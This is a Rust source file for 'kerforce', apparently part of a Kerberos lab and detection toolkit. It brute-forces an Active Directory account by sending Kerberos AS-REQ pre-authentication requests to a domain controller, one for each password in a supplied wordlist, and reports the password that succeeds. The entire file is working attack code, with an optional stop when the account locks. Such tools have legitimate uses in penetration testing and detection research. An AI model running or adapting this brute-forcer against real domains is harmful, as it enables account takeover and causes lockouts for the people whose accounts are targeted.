extern crate clap;
extern crate kerlab;

use clap::{App, Arg};
use std::fs::File;
use std::io;
use std::io::BufRead;
use kerlab::krbkdcreq::{AsReq, KdcOptionsType};
use kerlab::request::{KrbResponse, TcpRequest};
use kerlab::krbkdcrep::AsRep;
use kerlab::encryption::{EncryptionKey};

const APPLICATION_NAME: &str = "kerforce";

fn main() {
    let matches = App::new(APPLICATION_NAME)
        .version("0.1.0")
        .author("Sylvain Peyrefitte <citronneur@gmail.com>")
        .about("Kerberos Lab for Fun and Detection")
        .arg(Arg::with_name("dc")
            .long("dc")
            .takes_value(true)
            .help("host IP of the Domain Controller"))
        .arg(Arg::with_name("port")
            .long("port")
            .takes_value(true)
            .default_value("88")
            .help("Domain Controller Kerberos port"))
        .arg(Arg::with_name("domain")
                 .long("domain")
                 .takes_value(true)
                 .help("Windows Domain"))
        .arg(Arg::with_name("username")
                 .long("username")
                 .takes_value(true)
                 .help("Username of TGT"))
        .arg(Arg::with_name("file")
                 .long("file")
                 .takes_value(true)
                 .help("File that contain password file"))
        .arg(Arg::with_name("safe")
                 .long("safe")
                 .help("Stop when account it's first locked"))
        .get_matches();

    let file = File::open(matches.value_of("file").unwrap()).unwrap();
    let ip = matches.value_of("dc").expect("You need to provide a dc argument");
    let port = matches.value_of("port").unwrap_or_default();
    let username = matches.value_of("username").unwrap();
    let domain = matches.value_of("domain").unwrap();


    println!("Try brute force user {}\\{}", domain, username);
    let options = vec![
        KdcOptionsType::Renewable,
        KdcOptionsType::RenewableOk
    ];

    for line in io::BufReader::new(file).lines() {
        let password = line.unwrap();
        let mut tgt_request = AsReq::new(
            domain,
            username,
            &options
        ).unwrap();

        tgt_request = tgt_request.with_preauth(
            &EncryptionKey::new_rc4_hmac(password.as_str()).unwrap()
        ).unwrap();

        let tgt_response = TcpRequest::ask_for::<AsRep, String>(
            &tgt_request,
            format!("{}:{}", ip, port)
        ).unwrap();

        match tgt_response {
            KrbResponse::Error(e) => {
                println!("Failed {} {}", password, e.error_code.inner);
                if matches.is_present("safe") && e.error_code.inner == 18 {
                    break;
                }
            }
            KrbResponse::Response(_) => {
                println!("Pwned !!! {}\\{} : {}", domain, username, password);
                break;
            }
        }
    }
}